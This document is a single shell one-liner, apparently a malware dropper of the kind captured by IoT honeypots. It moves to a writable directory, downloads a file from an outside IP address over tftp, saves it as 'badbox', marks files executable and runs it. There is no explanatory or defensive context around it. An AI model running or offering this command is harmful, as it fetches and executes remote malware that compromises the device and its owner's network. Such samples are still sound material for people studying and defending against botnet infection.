cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 87.121.98.51 -c get pftp;cat pftp >badbox;chmod +x *;./badbox
